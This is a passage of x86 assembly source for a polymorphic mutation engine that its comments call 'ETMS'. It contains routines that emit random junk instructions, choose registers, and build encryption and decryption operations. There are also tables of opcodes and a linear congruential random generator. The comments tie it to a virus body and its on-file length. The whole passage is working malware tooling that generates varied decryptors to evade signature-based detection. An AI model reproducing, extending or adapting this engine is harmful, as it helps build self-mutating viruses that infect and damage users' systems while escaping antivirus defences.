        stosw                           ; mov important_reg,some_reg
        pop     ebx
        mov     byte ptr [r_used+ebp],bl    ; restore regs status
skip_changer:
        ret

select_save:
        call    get_random_al7
        sub     al,5                    ; get from 0 to 2
        jc      select_save

        xchg    eax,edx
        add     edx,offset r_pointer
        add     edx,ebp
        mov     al,byte ptr [edx]

        cmp     al,0ffh                 ; not already assigned?
        je      exit_bad

        cmp     al,20h                  ; no key signature, if so skip
        je      exit_bad

        call    is_used                 ; maybe is already saved on stack or
        jnz     return_good             ; such?
exit_bad:
        stc
        ret
return_good:
        mov     cl,byte ptr [r_used+ebp]
        clc
        ret

save_mov_xchg:
        xchg    eax,ebx
        call    get_register            ; get an usable register
        xchg    eax,ecx
        call    set_used                ; set this one as used
        call    unset_used              ; and the previous as unused
        mov     ah,087h                 ; xchg reg,reg base
        push    eax
        xor     ecx,ecx
        call    get_random              ; select if using mov or xchg
        shr     al,1
        jc      use_mov_first
        mov     cl,4                    ; + 4 becames mov reg,reg base
use_mov_first:
        shr     al,1                    ; when just saving this won't be used
        jc      use_mov_after           ; select whichone for restore aswell
        mov     ch,4
use_mov_after:
        pop     eax
        add     ah,ch                   ; restore one
        push    eax
        sub     ah,ch
        add     ah,cl
        shl     al,3                    ; * 8
        add     al,bl
        or      al,0c0h                 ; mov some_reg,important_reg
        xchg    al,ah
        stosw                           ; put the moving of regs
        call    rnd_garbage
        pop     eax
        ret


; tables for various purposes
garbage_offsets:
        dd      offset  call_subroutines
        dd      offset  gen_one_byters
        dd      offset  mov_registers
        dd      offset  mem_assign
        dd      offset  mem_mathops
        dd      offset  maths_immediate
        dd      offset  maths_immediate_short
        dd      offset  maths_registers
        dd      offset  rotating_imms
        dd      offset  notneg_register
        dd      offset  imm_assign
        dd      offset  inc_dec_reg
        dd      offset  xchg_regs
        dd      offset  test_regs
        dd      offset  temp_save_change
        dd      offset  cdq_jmps_savestack


one_byters      db      090h,0fch,0fdh,0f8h,0f9h,0f5h,070h,080h

change_jump     db      098h,099h,0ebh,0e9h

_math_imm:
        dw      008c1h  ; ror d[ebx],imm
        dw      02881h  ; sub d[ebx],imm
        dw      03081h  ; xor d[ebx],imm
        dw      00081h  ; add d[ebx],imm
        dw      000c1h  ; rol d[ebx],imm
_math_key:
        dw      008d3h  ; ror d[ebx],cl
        dw      00029h  ; sub d[ebx],eax
        dw      00031h  ; xor d[ebx],eax
        dw      00001h  ; add d[ebx],eax
        dw      000d3h  ; rol d[ebx],cl

; cmp,or,xor,sub,add
chk_counter     db      0f8h,0c8h
key_changers    db      0e8h,0f0h,0c0h  ; xor sub add
                db      0c0h,0c8h       ; ror rol
                db      040h,048h       ; inc dec

get_address:
        push    esi
        mov     ebx,edi
        lea     esi,[offset v_runnin + ebp]
        sub     ebx,dword ptr [esi - (offset v_runnin - offset t_inipnt)]
                                                ; actual decryptor lenght
        add     ebx,dword ptr [esi - (offset v_runnin - offset v_lenght)]

        mov     edx,dword ptr [esi]

                db      0b1h            ; mov cl,
t_memand        db      00h             ; significant bytes present

        add     edx,ebx

search_offset2:
        call    get_random
        shl     eax,cl
        shr     eax,cl
        cmp     eax,dword ptr [esi]     ; is < starting off of poly?
        jb      search_offset2
look_foroff2:
        cmp     eax,edx                 ; upper border
        jbe     ok_offset2
        sub     eax,ebx
        jmp     look_foroff2
ok_offset2:
        pop     esi
        ret

get_random_al7:
        call    get_random
        and     eax,0111b
        ret

get_random:
        push    ebx
        push    edx

        db     0b8h                     ; mov eax,
seed    dd     000h                     ; random seed, must be < im

        mov     ebx,4096d                ; ia
        mul     ebx
        add     eax,150889d              ; ic
        adc     edx,0
        mov     ebx,714025d              ; im
        push    ebx
        div     ebx
        mov     dword ptr [seed+ebp],edx
        xchg    eax,edx
        cdq
        xor     ebx,ebx
        dec     ebx
        mul     ebx                     ; * 2^32 - 1
        pop     ebx
        div     ebx                     ; here we have a 0<=rnd<=2^32
        pop     edx
        pop     ebx
        ret


is_used:
; AL register
        push    eax
        mov     cl,al
        mov     al,1
        shl     al,cl
        test    byte ptr [r_used+ebp],al
        pop     eax
; Z  = register not used
; NZ = register used
        ret

set_used:
; AL register
        push    eax
        mov     cl,al
        mov     al,1
        shl     al,cl
        or      byte ptr [r_used+ebp],al
        pop     eax
        ret

unset_used:
; BL register
        push    eax
        mov     cl,bl
        mov     al,1
        shl     al,cl
        not     al
        and     byte ptr [r_used+ebp],al
        pop     eax
        ret

get_register:
        push    eax
reget_reg:
        call    get_random_al7
        call    is_used
        jnz     reget_reg               ; check we aren't using it
; the is_used will put the reg in cl
        pop     eax
        ret

; how much memory does the ETMS need, so you can substract from the lenght
; of the virus on file of course
_mem_space      =       (offset _mem_data_end - offset _mem_data_start)

_mem_data_start:

t_inipnt        dd      00h             ; initial EDI

r_pointer       db      00h             ; register used as pointer
r_counter       db      00h             ; register used as counter
r_regkey        db      00h             ; register used as key, 20h use
                                        ; immediate as key
r_used          db      00000000b
;  bits meaning          0 0 0 1 0 0 0 0
;                        E E E E E E E E
;                        D S B S B D C A
;                        I I P P X X X X

t_chgpnt        db      00h             ; changes to be made to pointer
t_chgcnt        db      00h             ; changes to be made to counter
t_chgkey        db      00h             ; changes to be made to key register
t_chgmat        db      00h             ; changes to be made to operation

t_pntoff        dd      00h             ; offset added to pointer (00h if not
                                        ; added)
t_cntoff        dd      00h             ; constant to be added to counter
                                        ; value

t_fromend       db      00h             ; 00h from start, else from end
t_countback     db      00h             ; 00h decrementing, else incrementing
t_pushed        db      00h             ; pushed dwords
t_maxjmps       db      00h             ; max jumps
t_inacall       db      00h             ; into a call or not
                db      00h             ; just to optimize poly size :)

v_lenght        dd      00h             ; lenght
v_virusp        dd      00h             ; pointer to body
v_runnin        dd      00h             ; offset at which dec will run

w_counter       dd      00h             ; where counter is assigned - 1
w_pointer       dd      00h             ; where pointer is assigned - 1
w_loopbg        dd      00h             ; where loop begins
w_encrypt       dd      00h             ; pointer on current pos in encryptor

_mem_data_end:




